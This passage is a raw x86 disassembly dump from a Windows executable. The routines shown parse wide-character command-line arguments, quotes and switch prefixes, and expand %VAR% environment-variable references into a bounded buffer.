  405207:	test   ebx,ebx
  405209:	je     0x405213
  40520b:	mov    DWORD PTR [ebx],esi
  40520d:	add    ebx,0x4
  405210:	mov    DWORD PTR [ebp-0x8],ebx
  405213:	push   0x22
  405215:	pop    ecx
  405216:	cmp    WORD PTR [esi],cx
  405219:	jne    0x40525f
  40521b:	add    esi,0x2
  40521e:	cmp    esi,edi
  405220:	jae    0x40530f
  405226:	movzx  eax,WORD PTR [esi]
  405229:	cmp    eax,0x5c
  40522c:	jne    0x405233
  40522e:	add    esi,0x2
  405231:	jmp    0x405238
  405233:	cmp    ax,cx
  405236:	je     0x40523f
  405238:	add    esi,0x2
  40523b:	cmp    esi,edi
  40523d:	jb     0x405226
  40523f:	cmp    esi,edi
  405241:	jae    0x40530f
  405247:	lea    eax,[esi+0x2]
  40524a:	push   0x401090
  40524f:	push   eax
  405250:	call   DWORD PTR ds:0x437544
  405256:	pop    ecx
  405257:	pop    ecx
  405258:	mov    esi,eax
  40525a:	jmp    0x4052fd
  40525f:	push   0x401650
  405264:	push   esi
  405265:	call   DWORD PTR ds:0x437544
  40526b:	mov    esi,eax
  40526d:	pop    ecx
  40526e:	pop    ecx
  40526f:	test   esi,esi
  405271:	je     0x4052ca
  405273:	mov    bl,BYTE PTR [ebp-0x1]
  405276:	cmp    esi,edi
  405278:	jae    0x40529d
  40527a:	push   0x2f
  40527c:	pop    eax
  40527d:	cmp    WORD PTR [esi],ax
  405280:	jne    0x40529d
  405282:	test   bl,bl
  405284:	jne    0x40529d
  405286:	lea    eax,[esi+0x2]
  405289:	push   0x401650
  40528e:	push   eax
  40528f:	call   DWORD PTR ds:0x437544
  405295:	mov    esi,eax
  405297:	pop    ecx
  405298:	pop    ecx
  405299:	test   esi,esi
  40529b:	jne    0x405276
  40529d:	mov    ebx,DWORD PTR [ebp-0x8]
  4052a0:	test   esi,esi
  4052a2:	je     0x4052ca
  4052a4:	push   0x22
  4052a6:	pop    eax
  4052a7:	cmp    WORD PTR [esi],ax
  4052aa:	jne    0x4052ca
  4052ac:	jmp    0x4052b3
  4052ae:	cmp    WORD PTR [esi],ax
  4052b1:	je     0x4052ba
  4052b3:	add    esi,0x2
  4052b6:	cmp    esi,edi
  4052b8:	jb     0x4052ae
  4052ba:	push   0x401090
  4052bf:	push   esi
  4052c0:	call   DWORD PTR ds:0x437544
  4052c6:	pop    ecx
  4052c7:	pop    ecx
  4052c8:	mov    esi,eax
  4052ca:	cmp    BYTE PTR [ebp-0x1],0x0
  4052ce:	je     0x4052fd
  4052d0:	mov    BYTE PTR [ebp-0x1],0x0
  4052d4:	test   esi,esi
  4052d6:	je     0x405301
  4052d8:	push   0x2f
  4052da:	pop    eax
  4052db:	cmp    WORD PTR [esi],ax
  4052de:	jne    0x4052fd
  4052e0:	test   ebx,ebx
  4052e2:	je     0x4052fd
  4052e4:	xor    eax,eax
  4052e6:	mov    WORD PTR [esi],ax
  4052e9:	mov    ecx,DWORD PTR [ebx-0x4]
  4052ec:	call   0x40dd18
  4052f1:	mov    DWORD PTR [ebx-0x4],eax
  4052f4:	push   0x2f
  4052f6:	pop    eax
  4052f7:	mov    WORD PTR [esi],ax
  4052fa:	sub    esi,0x2
  4052fd:	test   esi,esi
  4052ff:	jne    0x405303
  405301:	mov    esi,edi
  405303:	test   ebx,ebx
  405305:	je     0x40530f
  405307:	xor    eax,eax
  405309:	mov    WORD PTR [esi],ax
  40530c:	add    esi,0x2
  40530f:	mov    eax,DWORD PTR [ebp-0xc]
  405312:	inc    DWORD PTR [eax]
  405314:	cmp    esi,edi
  405316:	jb     0x4051ee
  40531c:	xor    ecx,ecx
  40531e:	test   ebx,ebx
  405320:	je     0x405324
  405322:	mov    DWORD PTR [ebx],ecx
  405324:	pop    edi
  405325:	pop    esi
  405326:	pop    ebx
  405327:	leave  
  405328:	ret    0x4
  40532b:	push   ebp
  40532c:	mov    ebp,esp
  40532e:	push   ebx
  40532f:	push   esi
  405330:	push   edi
  405331:	mov    edi,edx
  405333:	mov    esi,ecx
  405335:	call   0x40dcc8
  40533a:	mov    ecx,esi
  40533c:	mov    ebx,eax
  40533e:	call   0x40dd18
  405343:	push   DWORD PTR [ebp+0x10]
  405346:	mov    edx,edi
  405348:	push   DWORD PTR [ebp+0xc]
  40534b:	mov    ecx,ebx
  40534d:	push   DWORD PTR [ebp+0x8]
  405350:	mov    DWORD PTR [ebx+0x4],eax
  405353:	call   0x40536d
  405358:	mov    ecx,DWORD PTR ds:0x43265c
  40535e:	pop    edi
  40535f:	pop    esi
  405360:	mov    DWORD PTR [ebx],ecx
  405362:	mov    DWORD PTR ds:0x43265c,ebx
  405368:	pop    ebx
  405369:	pop    ebp
  40536a:	ret    0xc
  40536d:	push   ebp
  40536e:	mov    ebp,esp
  405370:	sub    esp,0x30
  405373:	xor    eax,eax
  405375:	inc    DWORD PTR ds:0x421ef0
  40537b:	push   ebx
  40537c:	push   esi
  40537d:	mov    esi,eax
  40537f:	mov    DWORD PTR [ebp-0x10],eax
  405382:	mov    al,ds:0x4114bc
  405387:	mov    ebx,edx
  405389:	push   edi
  40538a:	mov    DWORD PTR [ebp-0x1c],ebx
  40538d:	mov    edi,ecx
  40538f:	mov    DWORD PTR [ebp-0xc],esi
  405392:	test   al,0x8
  405394:	jne    0x4053b7
  405396:	test   al,0x10
  405398:	je     0x4053c0
  40539a:	test   edi,edi
  40539c:	je     0x4053b7
  40539e:	mov    bl,BYTE PTR [ebp+0xc]
  4053a1:	shr    bl,0x2
  4053a4:	and    bl,0x1
  4053a7:	mov    ecx,DWORD PTR [edi+0x4]
  4053aa:	mov    dl,bl
  4053ac:	call   0x4071c4
  4053b1:	mov    edi,DWORD PTR [edi]
  4053b3:	test   edi,edi
  4053b5:	jne    0x4053a7
  4053b7:	xor    eax,eax
  4053b9:	pop    edi
  4053ba:	pop    esi
  4053bb:	pop    ebx
  4053bc:	leave  
  4053bd:	ret    0xc
  4053c0:	test   ebx,ebx
  4053c2:	je     0x4057c7
  4053c8:	mov    al,BYTE PTR [ebp+0xc]
  4053cb:	shr    al,0x6
  4053ce:	push   0x2
  4053d0:	mov    DWORD PTR [ebp-0x20],0x5e
  4053d7:	pop    edi
  4053d8:	mov    DWORD PTR [ebp-0x24],0x24
  4053df:	and    eax,0xffffff01
  4053e4:	mov    DWORD PTR [ebp-0x30],eax
  4053e7:	mov    ecx,DWORD PTR [ebx+0x4]
  4053ea:	push   eax
  4053eb:	lea    eax,[ebp+0x8]
  4053ee:	push   eax
  4053ef:	lea    edx,[ebp-0x18]
  4053f2:	call   0x408aed
  4053f7:	mov    edx,DWORD PTR [ebp-0x18]
  4053fa:	mov    ecx,edx
  4053fc:	mov    bl,al
  4053fe:	xor    eax,eax
  405400:	mov    DWORD PTR [ebp-0x4],ecx
  405403:	movzx  esi,WORD PTR [edx]
  405406:	mov    bh,al
  405408:	mov    ds:0x431f20,eax
  40540d:	mov    BYTE PTR [ebp-0x8],bh
  405410:	mov    eax,edx
  405412:	mov    DWORD PTR [ebp-0x28],esi
  405415:	test   si,si
  405418:	je     0x405437
  40541a:	xor    esi,esi
  40541c:	movzx  edx,WORD PTR [eax]
  40541f:	cmp    dx,WORD PTR [ebp-0x20]
  405423:	je     0x40542b
  405425:	cmp    dx,WORD PTR [ebp-0x24]
  405429:	jne    0x40542d
  40542b:	add    eax,edi
  40542d:	add    eax,edi
  40542f:	cmp    WORD PTR [eax],si
  405432:	jne    0x40541c
  405434:	mov    esi,DWORD PTR [ebp-0x28]
  405437:	movzx  esi,si
  40543a:	push   0x21
  40543c:	pop    eax
  40543d:	cmp    si,ax
  405440:	je     0x4054bf
  405442:	push   0x2d
  405444:	pop    eax
  405445:	cmp    si,ax
  405448:	je     0x4054bf
  40544a:	push   0x40
  40544c:	pop    eax
  40544d:	push   0x5e
  40544f:	pop    edx
  405450:	cmp    si,ax
  405453:	je     0x4054c2
  405455:	cmp    si,dx
  405458:	je     0x4054c2
  40545a:	push   0x20
  40545c:	pop    eax
  40545d:	cmp    si,ax
  405460:	je     0x4054c2
  405462:	push   0x9
  405464:	pop    eax
  405465:	cmp    si,ax
  405468:	je     0x4054c2
  40546a:	test   bh,0x4
  40546d:	je     0x405614
  405473:	mov    edx,DWORD PTR [ebp+0x8]
  405476:	lea    eax,[ebp-0xc]
  405479:	push   eax
  40547a:	push   DWORD PTR [ebp+0x10]
  40547d:	push   DWORD PTR [ebp-0x8]
  405480:	push   DWORD PTR [ebp+0xc]
  405483:	call   0x406ef4
  405488:	test   al,al
  40548a:	je     0x405611
  405490:	mov    esi,DWORD PTR [ebp-0x4]
  405493:	push   0x24
  405495:	pop    eax
  405496:	push   eax
  405497:	push   esi
  405498:	call   DWORD PTR ds:0x437540
  40549e:	pop    ecx
  40549f:	pop    ecx
  4054a0:	test   eax,eax
  4054a2:	je     0x4055cf
  4054a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4054ab:	lea    eax,[ebp+0x8]
  4054ae:	push   eax
  4054af:	or     dl,0xff
  4054b2:	call   0x40e68f
  4054b7:	mov    DWORD PTR [ebp-0x4],eax
  4054ba:	jmp    0x4055d2
  4054bf:	push   0x5e
  4054c1:	pop    edx
  4054c2:	movzx  eax,si
  4054c5:	cmp    eax,0x21
  4054c8:	je     0x4055b3
  4054ce:	cmp    eax,0x2d
  4054d1:	je     0x40551a
  4054d3:	cmp    eax,0x40
  4054d6:	je     0x405505
  4054d8:	cmp    eax,edx
  4054da:	jne    0x4055b9
  4054e0:	add    ecx,edi
  4054e2:	mov    DWORD PTR [ebp-0x4],ecx
  4054e5:	movzx  eax,WORD PTR [ecx]
  4054e8:	push   0x20
  4054ea:	pop    edx
  4054eb:	cmp    ax,dx
  4054ee:	je     0x4055c2
  4054f4:	push   0x9
  4054f6:	pop    edx
  4054f7:	cmp    ax,dx
  4054fa:	jne    0x40546a
  405500:	jmp    0x4055c2
  405505:	test   BYTE PTR ds:0x4114be,0x4
  40550c:	jne    0x4055b9
  405512:	or     bh,0x1
  405515:	jmp    0x4055b6
  40551a:	add    ecx,edi
  40551c:	mov    DWORD PTR [ebp-0x4],ecx
  40551f:	movzx  eax,WORD PTR [ecx]
  405522:	or     bh,0x2
  405525:	push   eax
  405526:	mov    BYTE PTR [ebp-0x8],bh
  405529:	call   DWORD PTR ds:0x4373f4
  40552f:	pop    ecx
  405530:	test   eax,eax
  405532:	je     0x40559f
  405534:	mov    edi,DWORD PTR [ebp-0x4]
  405537:	push   0xa
  405539:	lea    eax,[ebp-0x4]
  40553c:	push   eax
  40553d:	push   edi
  40553e:	call   DWORD PTR ds:0x4373f8
  405544:	add    esp,0xc
  405547:	mov    ds:0x431f20,eax
  40554c:	call   DWORD PTR ds:0x4373fc
  405552:	cmp    DWORD PTR [eax],0x22
  405555:	jne    0x405573
  405557:	mov    eax,DWORD PTR [ebp-0x4]
  40555a:	push   edi
  40555b:	push   0x436
  405560:	push   DWORD PTR ds:0x4216d4
  405566:	xor    ecx,ecx
  405568:	mov    WORD PTR [eax],cx
  40556b:	call   0x405021
  405570:	add    esp,0xc
  405573:	mov    eax,DWORD PTR [ebp-0x4]
  405576:	movzx  eax,WORD PTR [eax]
  405579:	push   eax
  40557a:	call   DWORD PTR ds:0x43753c
  405580:	pop    ecx
  405581:	push   0x2
  405583:	pop    edi
  405584:	jmp    0x405599
  405586:	mov    eax,DWORD PTR [ebp-0x4]
  405589:	add    eax,edi
  40558b:	mov    DWORD PTR [ebp-0x4],eax
  40558e:	movzx  eax,WORD PTR [eax]
  405591:	push   eax
  405592:	call   DWORD PTR ds:0x43753c
  405598:	pop    ecx
  405599:	test   eax,eax
  40559b:	jne    0x405586
  40559d:	jmp    0x4055a6
  40559f:	or     DWORD PTR ds:0x431f20,0xffffffff
  4055a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4055a9:	sub    ecx,edi
  4055ab:	push   0x5e
  4055ad:	mov    DWORD PTR [ebp-0x4],ecx
  4055b0:	pop    edx
  4055b1:	jmp    0x4055b9
  4055b3:	or     bh,0x4
  4055b6:	mov    BYTE PTR [ebp-0x8],bh
  4055b9:	cmp    si,dx
  4055bc:	je     0x40546a
  4055c2:	add    ecx,edi
  4055c4:	mov    DWORD PTR [ebp-0x4],ecx
  4055c7:	movzx  esi,WORD PTR [ecx]
  4055ca:	jmp    0x40543a
  4055cf:	mov    eax,DWORD PTR [ebp-0x4]
  4055d2:	cmp    esi,eax
  4055d4:	je     0x4055de
  4055d6:	push   eax
  4055d7:	call   DWORD PTR ds:0x43754c
  4055dd:	pop    ecx
  4055de:	test   BYTE PTR [ebp+0xc],0x2
  4055e2:	mov    esi,DWORD PTR [ebp-0xc]
  4055e5:	jne    0x4057b4
  4055eb:	cmp    BYTE PTR ds:0x4216e7,0x0
  4055f2:	je     0x4057b4
  4055f8:	test   esi,esi
  4055fa:	je     0x4057b4
  405600:	cmp    esi,DWORD PTR ds:0x431f20
  405606:	ja     0x4057c7
  40560c:	jmp    0x4057b4
  405611:	mov    ecx,DWORD PTR [ebp-0x4]
  405614:	mov    DWORD PTR [ebp-0x2c],ecx
  405617:	test   bl,bl
  405619:	jne    0x405640
  40561b:	push   0x24
  40561d:	pop    eax
  40561e:	push   eax
  40561f:	push   ecx
  405620:	call   DWORD PTR ds:0x437540
  405626:	pop    ecx
  405627:	pop    ecx
  405628:	mov    ecx,DWORD PTR [ebp-0x4]
  40562b:	test   eax,eax
  40562d:	je     0x405640
  40562f:	lea    eax,[ebp+0x8]
  405632:	push   eax
  405633:	or     dl,0xff
  405636:	call   0x40e68f
  40563b:	mov    ecx,eax
  40563d:	mov    DWORD PTR [ebp-0x4],ecx
  405640:	lea    edx,[ecx+0x2]
  405643:	xor    esi,esi
  405645:	mov    ax,WORD PTR [ecx]
  405648:	add    ecx,edi
  40564a:	cmp    ax,si
  40564d:	jne    0x405645
  40564f:	sub    ecx,edx
  405651:	sar    ecx,1
  405653:	mov    eax,0x8000
  405658:	lea    esi,[ecx+0x1]
  40565b:	cmp    esi,eax
  40565d:	ja     0x405661
  40565f:	mov    esi,eax
  405661:	xor    ecx,ecx
  405663:	mov    eax,esi
  405665:	mul    edi
  405667:	seto   cl
  40566a:	neg    ecx
  40566c:	or     ecx,eax
  40566e:	call   0x40a2fb
  405673:	push   DWORD PTR [ebp-0x4]
  405676:	mov    edi,eax
  405678:	push   esi
  405679:	push   edi
  40567a:	call   DWORD PTR ds:0x4373d0
  405680:	add    esp,0xc
  405683:	mov    edx,esi
  405685:	push   DWORD PTR [ebp+0x10]
  405688:	mov    ecx,edi
  40568a:	push   DWORD PTR [ebp-0x4]
  40568d:	call   0x40f42d
  405692:	test   al,al
  405694:	je     0x4056a9
  405696:	push   DWORD PTR [ebp-0x4]
  405699:	xor    eax,eax
  40569b:	push   0x447
  4056a0:	push   eax
  4056a1:	call   0x405021
  4056a6:	add    esp,0xc
  4056a9:	mov    bl,BYTE PTR [ebp+0xc]
  4056ac:	mov    al,bh
  4056ae:	mov    bh,BYTE PTR [ebp+0xc]
  4056b1:	shr    al,1
  4056b3:	mov    cl,al
  4056b5:	and    bl,0x4
  4056b8:	and    ecx,0xffffff01
  4056be:	mov    DWORD PTR [ebp-0x28],ecx
  4056c1:	and    bh,0x2
  4056c4:	mov    dl,BYTE PTR [ebp-0x8]
  4056c7:	test   bl,bl
  4056c9:	je     0x4056d4
  4056cb:	test   dl,0x8
  4056ce:	jne    0x4056d4
  4056d0:	xor    eax,eax
  4056d2:	jmp    0x4056d6
  4056d4:	mov    al,0x1
  4056d6:	test   bl,bl
  4056d8:	jne    0x4056e9
  4056da:	test   BYTE PTR [ebp+0xc],0x8
  4056de:	jne    0x4056e5
  4056e0:	test   dl,0x1
  4056e3:	je     0x4056e9
  4056e5:	xor    edx,edx
  4056e7:	jmp    0x4056eb
  4056e9:	mov    dl,0x1
  4056eb:	lea    esi,[ebp-0x14]
  4056ee:	push   esi
  4056ef:	push   ecx
  4056f0:	push   eax
  4056f1:	mov    ecx,edi
  4056f3:	call   0x4065b2
  4056f8:	mov    esi,eax
  4056fa:	mov    DWORD PTR [ebp-0xc],esi
  4056fd:	test   bh,bh
  4056ff:	jne    0x405775
  405701:	cmp    esi,0x103
  405707:	jne    0x40574c
  405709:	cmp    BYTE PTR ds:0x432633,bh
  40570f:	je     0x405732
  405711:	cmp    DWORD PTR [ebp-0x10],0xa
  405715:	jae    0x405750
  405717:	push   DWORD PTR [ebp-0x14]
  40571a:	xor    eax,eax
  40571c:	push   0xfad
  405721:	push   eax
  405722:	call   0x405021
  405727:	mov    ecx,DWORD PTR [ebp-0x28]
  40572a:	add    esp,0xc
  40572d:	inc    DWORD PTR [ebp-0x10]
  405730:	jmp    0x4056c4
  405732:	push   DWORD PTR [ebp-0x14]
  405735:	xor    eax,eax
  405737:	push   0xfac
  40573c:	push   eax
  40573d:	call   0x405021
  405742:	add    esp,0xc
  405745:	xor    eax,eax
  405747:	mov    esi,eax
  405749:	mov    DWORD PTR [ebp-0xc],esi
  40574c:	test   esi,esi
  40574e:	je     0x405775
  405750:	cmp    esi,DWORD PTR ds:0x431f20
  405756:	jbe    0x405775
  405758:	cmp    BYTE PTR ds:0x4216e7,0x0
  40575f:	jne    0x405775
  405761:	push   esi
  405762:	push   DWORD PTR [ebp-0x14]
  405765:	xor    eax,eax
  405767:	push   0x435
  40576c:	push   eax
  40576d:	call   0x405021
  405772:	add    esp,0x10
  405775:	mov    eax,DWORD PTR [ebp-0x2c]
  405778:	cmp    eax,DWORD PTR [ebp-0x4]
  40577b:	je     0x405787
  40577d:	push   DWORD PTR [ebp-0x4]
  405780:	call   DWORD PTR ds:0x43754c
  405786:	pop    ecx
  405787:	push   DWORD PTR [ebp-0x18]
  40578a:	call   DWORD PTR ds:0x43754c
  405790:	pop    ecx
  405791:	push   edi
  405792:	call   DWORD PTR ds:0x43754c
  405798:	pop    ecx
  405799:	test   bh,bh
  40579b:	jne    0x4057b1
  40579d:	cmp    BYTE PTR ds:0x4216e7,bh
  4057a3:	je     0x4057b1
  4057a5:	test   esi,esi
  4057a7:	je     0x4057b1
  4057a9:	cmp    esi,DWORD PTR ds:0x431f20
  4057af:	ja     0x4057c7
  4057b1:	push   0x2
  4057b3:	pop    edi
  4057b4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4057b7:	mov    eax,DWORD PTR [ebp-0x30]
  4057ba:	mov    ebx,DWORD PTR [ebx]
  4057bc:	mov    DWORD PTR [ebp-0x1c],ebx
  4057bf:	test   ebx,ebx
  4057c1:	jne    0x4053e7
  4057c7:	test   BYTE PTR [ebp+0xc],0x2
  4057cb:	jne    0x4053b7
  4057d1:	cmp    BYTE PTR ds:0x4216e7,0x0
  4057d8:	je     0x4053b7
  4057de:	cmp    esi,DWORD PTR ds:0x431f20
  4057e4:	jbe    0x4053b7
  4057ea:	mov    eax,esi
  4057ec:	jmp    0x4053b9
  4057f1:	push   ebp
  4057f2:	mov    ebp,esp
  4057f4:	mov    eax,0x10210
  4057f9:	call   0x410450
  4057fe:	mov    eax,ds:0x411018
  405803:	xor    eax,ebp
  405805:	mov    DWORD PTR [ebp-0x4],eax
  405808:	push   ebx
  405809:	push   esi
  40580a:	push   edi
  40580b:	xor    eax,eax
  40580d:	push   0x40165c
  405812:	mov    DWORD PTR [ebp-0x10210],eax
  405818:	mov    DWORD PTR [ebp-0x1020c],eax
  40581e:	lea    eax,[ebp-0x10208]
  405824:	push   0x8000
  405829:	push   eax
  40582a:	call   DWORD PTR ds:0x4373d0
  405830:	add    esp,0xc
  405833:	mov    esi,0x4114c8
  405838:	push   0x2
  40583a:	lea    edi,[ebp-0x10200]
  405840:	pop    ebx
  405841:	movzx  eax,WORD PTR [esi]
  405844:	cmp    eax,0x20
  405847:	je     0x40584e
  405849:	cmp    eax,0x9
  40584c:	jne    0x405852
  40584e:	add    esi,ebx
  405850:	jmp    0x405841
  405852:	push   0x3d
  405854:	pop    eax
  405855:	push   eax
  405856:	push   esi
  405857:	call   DWORD PTR ds:0x437540
  40585d:	pop    ecx
  40585e:	pop    ecx
  40585f:	test   eax,eax
  405861:	jne    0x40586d
  405863:	mov    eax,0x401668
  405868:	jmp    0x405a8e
  40586d:	push   0x3d
  40586f:	pop    ecx
  405870:	jmp    0x405883
  405872:	mov    WORD PTR [edi],ax
  405875:	add    edi,ebx
  405877:	lea    eax,[ebp-0x208]
  40587d:	cmp    edi,eax
  40587f:	jae    0x4058cc
  405881:	add    esi,ebx
  405883:	movzx  eax,WORD PTR [esi]
  405886:	cmp    ax,cx
  405889:	jne    0x405872
  40588b:	movzx  eax,WORD PTR [esi]
  40588e:	test   ax,ax
  405891:	je     0x405a46
  405897:	push   0x25
  405899:	pop    edx
  40589a:	add    esi,ebx
  40589c:	cmp    ax,0x5e
  4058a0:	jne    0x4058d3
  4058a2:	movzx  eax,WORD PTR [esi]
  4058a5:	test   ax,ax
  4058a8:	je     0x405a46
  4058ae:	add    esi,ebx
  4058b0:	mov    WORD PTR [edi],ax
  4058b3:	lea    eax,[ebp-0x208]
  4058b9:	add    edi,ebx
  4058bb:	cmp    edi,eax
  4058bd:	jae    0x4058cc
  4058bf:	movzx  eax,WORD PTR [esi]
  4058c2:	test   ax,ax
  4058c5:	jne    0x40589a
  4058c7:	jmp    0x405a46
  4058cc:	xor    eax,eax
  4058ce:	jmp    0x405a8e
  4058d3:	cmp    ax,dx
  4058d6:	jne    0x4058b0
  4058d8:	lea    ecx,[ebp-0x208]
  4058de:	jmp    0x4058f3
  4058e0:	test   ax,ax
  4058e3:	je     0x4058fb
  4058e5:	mov    WORD PTR [ecx],ax
  4058e8:	add    ecx,ebx
  4058ea:	lea    eax,[ebp-0x6]
  4058ed:	cmp    ecx,eax
  4058ef:	je     0x4058cc
  4058f1:	add    esi,ebx
  4058f3:	movzx  eax,WORD PTR [esi]
  4058f6:	cmp    ax,dx
  4058f9:	jne    0x4058e0
  4058fb:	xor    eax,eax
  4058fd:	mov    WORD PTR [ecx],ax
  405900:	mov    ax,WORD PTR [esi]
  405903:	add    esi,ebx
  405905:	test   ax,ax
  405908:	je     0x4059f3
  40590e:	lea    eax,[ebp-0x208]
  405914:	push   eax
  405915:	xor    eax,eax
  405917:	push   eax
  405918:	lea    eax,[ebp-0x1020c]
  40591e:	push   eax
  40591f:	call   DWORD PTR ds:0x437400
  405925:	mov    edx,DWORD PTR [ebp-0x1020c]
  40592b:	add    esp,0xc
  40592e:	test   edx,edx
  405930:	je     0x40598c
  405932:	mov    ecx,edx
  405934:	lea    ebx,[ecx+0x2]
  405937:	mov    ax,WORD PTR [ecx]
  40593a:	add    ecx,0x2
  40593d:	cmp    ax,WORD PTR [ebp-0x10210]
  405944:	jne    0x405937
  405946:	sub    ecx,ebx
  405948:	sar    ecx,1
  40594a:	lea    eax,[ebp-0x208]
  405950:	lea    ebx,[edi+ecx*2]
  405953:	cmp    ebx,eax
  405955:	jae    0x4058cc
  40595b:	sub    eax,edi
  40595d:	push   edx
  40595e:	sar    eax,1
  405960:	push   eax
  405961:	push   edi
  405962:	call   DWORD PTR ds:0x4373d0
  405968:	push   DWORD PTR [ebp-0x1020c]
  40596e:	mov    edi,ebx
  405970:	call   DWORD PTR ds:0x43754c
  405976:	add    esp,0x10
  405979:	xor    eax,eax
  40597b:	push   0x2
  40597d:	pop    ebx
  40597e:	push   0x25
  405980:	mov    DWORD PTR [ebp-0x1020c],eax
  405986:	pop    edx
  405987:	jmp    0x4058bf
  40598c:	lea    ecx,[ebp-0x208]
  405992:	lea    edx,[ecx+0x2]
  405995:	mov    ax,WORD PTR [ecx]
  405998:	add    ecx,ebx
  40599a:	cmp    ax,WORD PTR [ebp-0x10210]
  4059a1:	jne    0x405995
  4059a3:	sub    ecx,edx
  4059a5:	sar    ecx,1
  4059a7:	lea    eax,[ebp-0x208]
  4059ad:	lea    ebx,[ecx+0x2]
  4059b0:	lea    ebx,[edi+ebx*2]
  4059b3:	cmp    ebx,eax
  4059b5:	jae    0x4058cc
  4059bb:	push   0x25
  4059bd:	pop    eax
  4059be:	mov    WORD PTR [edi],ax
  4059c1:	lea    eax,[ebp-0x208]
  4059c7:	push   eax
  4059c8:	add    edi,0x2
  4059cb:	lea    eax,[ebp-0x208]
  4059d1:	sub    eax,edi
  4059d3:	sar    eax,1
  4059d5:	push   eax
  4059d6:	push   edi
  4059d7:	call   DWORD PTR ds:0x4373d0
  4059dd:	add    esp,0xc
  4059e0:	lea    edi,[ebx-0x2]
  4059e3:	push   0x25
  4059e5:	pop    edx
  4059e6:	push   0x2
  4059e8:	pop    ebx
  4059e9:	mov    WORD PTR [edi],dx
  4059ec:	add    edi,ebx
  4059ee:	jmp    0x4058bf
  4059f3:	lea    ecx,[ebp-0x208]
  4059f9:	xor    esi,esi
  4059fb:	lea    edx,[ecx+0x2]
  4059fe:	mov    ax,WORD PTR [ecx]
  405a01:	add    ecx,ebx
  405a03:	cmp    ax,si
  405a06:	jne    0x4059fe
  405a08:	sub    ecx,edx
  405a0a:	sar    ecx,1
  405a0c:	lea    eax,[ebp-0x208]
  405a12:	lea    esi,[ecx+0x1]
  405a15:	lea    esi,[edi+esi*2]
  405a18:	cmp    esi,eax
  405a1a:	jae    0x4058cc
  405a20:	push   0x25
  405a22:	pop    eax
  405a23:	mov    WORD PTR [edi],ax
  405a26:	lea    eax,[ebp-0x208]
  405a2c:	push   eax
  405a2d:	add    edi,ebx
  405a2f:	lea    eax,[ebp-0x208]
  405a35:	sub    eax,edi
  405a37:	sar    eax,1
  405a39:	push   eax
  405a3a:	push   edi
  405a3b:	call   DWORD PTR ds:0x4373d0
  405a41:	add    esp,0xc
  405a44:	mov    edi,esi
  405a46:	xor    eax,eax
  405a48:	mov    WORD PTR [edi],ax
  405a4b:	lea    eax,[ebp-0x10208]
  405a51:	push   eax
  405a52:	push   0x8000
  405a57:	push   0x4114c0
  405a5c:	call   DWORD PTR ds:0x4373d0
  405a62:	xor    eax,eax
  405a64:	lea    ecx,[ebp-0x10208]
  405a6a:	add    esp,0xc
  405a6d:	mov    WORD PTR [ebp-0x10200],ax
  405a74:	lea    edx,[ecx+0x2]
  405a77:	xor    esi,esi
  405a79:	mov    ax,WORD PTR [ecx]
  405a7c:	add    ecx,ebx
  405a7e:	cmp    ax,si
  405a81:	jne    0x405a79
  405a83:	sub    ecx,edx
  405a85:	sar    ecx,1
  405a87:	lea    eax,[ecx*2+0x4114c0]
  405a8e:	mov    ecx,DWORD PTR [ebp-0x4]
  405a91:	pop    edi
  405a92:	pop    esi
  405a93:	xor    ecx,ebp
  405a95:	pop    ebx
  405a96:	call   0x40fd0b
  405a9b:	leave  
  405a9c:	ret    
  405a9d:	push   ebp
  405a9e:	mov    ebp,esp
  405aa0:	sub    esp,0xc
  405aa3:	push   ebx
  405aa4:	push   esi
  405aa5:	mov    esi,ecx
  405aa7:	push   edi
  405aa8:	mov    ecx,0x401668
  405aad:	call   0x40dd18
  405ab2:	mov    ebx,eax
  405ab4:	xor    eax,eax
  405ab6:	cmp    WORD PTR [esi],ax
  405ab9:	je     0x405b94
  405abf:	push   0x25
  405ac1:	pop    ecx
  405ac2:	push   ecx
  405ac3:	push   esi
  405ac4:	call   DWORD PTR ds:0x437540
  405aca:	mov    edi,eax
  405acc:	pop    ecx
  405acd:	pop    ecx
  405ace:	test   edi,edi
  405ad0:	je     0x405b62
  405ad6:	lea    eax,[edi+0x2]
  405ad9:	push   0x25
  405adb:	push   eax
  405adc:	call   DWORD PTR ds:0x437540
  405ae2:	pop    ecx
  405ae3:	pop    ecx
  405ae4:	mov    DWORD PTR [ebp-0x8],eax
  405ae7:	test   eax,eax
  405ae9:	je     0x405b62
  405aeb:	xor    ecx,ecx
  405aed:	mov    WORD PTR [edi],cx
  405af0:	mov    DWORD PTR [ebp-0x4],ecx
  405af3:	mov    WORD PTR [eax],cx
  405af6:	mov    edx,esi
  405af8:	mov    ecx,ebx
  405afa:	call   0x40ddc2
  405aff:	mov    esi,eax
  405b01:	lea    ecx,[edi+0x2]
  405b04:	push   ecx
  405b05:	xor    eax,eax
  405b07:	push   eax
  405b08:	lea    eax,[ebp-0x4]
  405b0b:	push   eax
  405b0c:	call   DWORD PTR ds:0x437400
  405b12:	mov    edx,DWORD PTR [ebp-0x4]
  405b15:	add    esp,0xc
  405b18:	mov    ecx,esi
  405b1a:	test   edx,edx
  405b1c:	je     0x405b36
  405b1e:	call   0x40ddc2
  405b23:	push   DWORD PTR [ebp-0x4]
  405b26:	mov    ebx,eax
  405b28:	call   DWORD PTR ds:0x43754c
  405b2e:	xor    eax,eax
  405b30:	pop    ecx
  405b31:	mov    DWORD PTR [ebp-0x4],eax
  405b34:	jmp    0x405b51
  405b36:	push   0x25
  405b38:	pop    eax
  405b39:	mov    edx,edi
  405b3b:	mov    WORD PTR [edi],ax
  405b3e:	call   0x40ddc2
  405b43:	mov    edx,0x40166c
  405b48:	mov    ecx,eax
  405b4a:	call   0x40ddc2
  405b4f:	mov    ebx,eax
  405b51:	mov    esi,DWORD PTR [ebp-0x8]
  405b54:	push   0x25
  405b56:	pop    ecx
  405b57:	mov    WORD PTR [edi],cx
  405b5a:	mov    WORD PTR [esi],cx
  405b5d:	add    esi,0x2
  405b60:	jmp    0x405b89
  405b62:	mov    edx,esi
  405b64:	mov    ecx,ebx
  405b66:	call   0x40ddc2
  405b6b:	mov    ecx,esi
  405b6d:	mov    ebx,eax
  405b6f:	lea    edx,[ecx+0x2]
  405b72:	xor    edi,edi
  405b74:	mov    ax,WORD PTR [ecx]
  405b77:	add    ecx,0x2
  405b7a:	cmp    ax,di
  405b7d:	jne    0x405b74
  405b7f:	sub    ecx,edx
  405b81:	sar    ecx,1
  405b83:	push   0x25
